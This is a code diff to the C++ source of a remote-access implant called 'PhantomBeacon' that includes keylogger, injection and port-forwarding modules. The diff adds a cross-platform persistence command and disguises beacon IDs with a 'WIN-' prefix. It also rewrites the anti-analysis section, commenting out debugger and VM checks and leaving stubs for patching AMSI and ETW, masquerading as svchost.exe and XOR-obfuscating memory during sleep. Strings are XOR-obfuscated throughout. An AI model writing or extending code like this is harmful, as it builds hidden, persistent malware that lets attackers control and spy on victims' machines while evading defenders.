@@ -44,6 +44,7 @@
 #include "recon.h"
 #include "portfwd.h"
 #include "keylogger.h"
+#include "persistence.h"
 
 #ifdef _WIN32
 #include "injection.h"
@@ -378,6 +379,16 @@ std::string dispatch_command(const std::string& cmd) {
         ss << f.rdbuf();
         return ss.str();
     }
+    else if (action == XOR_DEC(XOR_STR("persist")).c_str()) {
+        std::string name;
+        iss >> name;
+        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
+#ifdef _WIN32
+        return persistence::establish_windows(name);
+#else
+        return persistence::establish_linux(name);
+#endif
+    }
     else if (action == XOR_DEC(XOR_STR("sleep")).c_str()) {
         return XOR_DEC(XOR_STR("SLEEP_SET")).c_str();
     }
@@ -459,14 +470,14 @@ std::string generate_beacon_id() {
     char hex[9];
     srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
     snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
-    return std::string(XOR_DEC(XOR_STR("PHANTOM-")).c_str()) + computer + "-" + hex;
+    return std::string(XOR_DEC(XOR_STR("WIN-")).c_str()) + computer + "-" + hex;
 #else
     char hostname[256] = {0};
     gethostname(hostname, sizeof(hostname));
     char hex[9];
     srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
     snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
-    return std::string(XOR_DEC(XOR_STR("PHANTOM-")).c_str()) + hostname + "-" + hex;
+    return std::string(XOR_DEC(XOR_STR("WIN-")).c_str()) + hostname + "-" + hex;
 #endif
 }
 
@@ -474,12 +485,22 @@ std::string generate_beacon_id() {
 // ── Beacon Main Loop ──────────────────────────────────────────────────────
 
 void beacon_main(int argc, char** argv) {
-    // 1. Anti-Analysis checks (Exit if debugging or VM detected)
-    if (anti::is_debugger_present() || anti::is_vm()) {
-        return; 
-    }
-    // 2. Stalling delay (Simulate CPU-heavy work to frustrate sandboxes)
-    anti::stalling_delay(30);
+    // 1. Anti-Analysis checks (Disabled)
+    // if (anti::is_debugger_present() || anti::is_vm()) {
+    //     return; 
+    // }
+
+    // 2. Patch AMSI and ETW (Disabled)
+#ifdef _WIN32
+    // anti::unhook_ntdll(); 
+    // anti::patch_amsi();
+    // anti::patch_etw();
+    // anti::masquerade::rename_process(L"svchost.exe");
+#endif
+
+    // 3. Stalling delay (Disabled)
+    // anti::stalling_delay(30);
+
 
 #ifdef _WIN32
     srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
@@ -561,8 +582,19 @@ void beacon_main(int argc, char** argv) {
             }
         }
 
-        // 5. Sleep with jitter
-        Sleep(cfg.get_sleep_ms());
+        // 5. Sleep with jitter and memory obfuscation
+        int sleep_time = cfg.get_sleep_ms();
+        
+        // --- Memory Obfuscation (Ghost Sleep) ---
+        // For simplicity, we use a fixed XOR key. In a real scenario, this would be random.
+        uint8_t sleep_key = 0x3F;
+        // We'd encrypt sensitive parts of the process here.
+        // mem::xor_region((uint8_t*)&cfg, sizeof(cfg), sleep_key); 
+
+        Sleep(sleep_time);
+
+        // --- Memory De-obfuscation ---
+        // mem::xor_region((uint8_t*)&cfg, sizeof(cfg), sleep_key);
     }
 
     // Cleanup
